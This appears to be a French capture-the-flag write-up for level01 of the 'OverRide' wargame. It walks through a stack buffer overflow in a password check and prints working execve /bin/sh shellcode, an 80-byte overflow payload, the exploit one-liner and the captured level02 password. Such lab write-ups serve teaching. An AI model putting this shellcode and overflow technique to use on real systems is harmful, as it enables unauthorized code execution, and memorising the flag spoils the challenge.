# OverRide - Level01 Writeup

## 🎯 Objectif

Exploiter une vulnérabilité dans le binaire `level01` pour obtenir un shell, puis lire le mot de passe du niveau suivant (`level02`).

---

## 🔍 Analyse du binaire

### Fonction `main`

Le binaire demande :

1. Un **nom d’utilisateur** (vérifié par `verify_user_name`)
2. Un **mot de passe** (vérifié par `verify_user_pass`)

Il utilise `fgets()` pour lire le mot de passe dans un **buffer de taille limitée**, sans protection contre les débordements.

---

## 🧨 Vulnérabilité

La fonction `verify_user_pass` lit jusqu’à **100 octets** via `fgets`, dans un buffer placé à `esp+0x1c`.

Le retour de fonction (`ret`) est stocké 80 octets après le début du buffer.

> ✅ **Offset pour écraser EIP** : 80 octets

---

## 🧬 Payload

### Shellcode

Un shellcode Linux x86 est injecté dans l’environnement via la variable `SC` :

```bash
export SC=$(python -c 'print("\x90"*1000 + "\x31\xc0\x50\x68\x2f\x2f\x73\x68" + "\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80")')
```

Shellcode utilisé (execve /bin/sh) :

```nasm
\x31\xc0\x50\x68\x2f\x2f\x73\x68
\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x99\xb0\x0b\xcd\x80
```

### Adresse ciblée

Le shellcode a été trouvé à l’adresse :

```
0xffffdbd6
```

Un long NOP-sled permet de viser cette zone avec marge d’erreur.

---

## 🚀 Exploit

Commande finale :

```bash
(python -c 'print("dat_wil")'; python -c 'print("A"*80 + "\xd6\xdb\xff\xff", end="")'; cat) | ./level01
```

* `"dat_wil"` : nom d’utilisateur valide
* `"A"*80` : remplissage jusqu’à l’EIP
* `"\xd6\xdb\xff\xff"` : adresse dans le NOP-sled
* `cat` : pour interagir avec le shell obtenu

---

## 🏁 Escalade & Flag

Depuis le shell :

```bash
cd ../level02
cat .pass
```

**Flag trouvé** :

```
PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv
```

---

## ✅ Résumé

| Élément       | Valeur                                     |
| ------------- | ------------------------------------------ |
| Buffer offset | 80 octets                                  |
| Shellcode     | injecté dans env (`$SC`)                   |
| Adresse jump  | `0xffffdbd6`                               |
| User valide   | `dat_wil`                                  |
| Flag          | `PwBLgNa8p8MTKW57S7zxVAQCxnCpV8JqTTs9XEBv` |

---

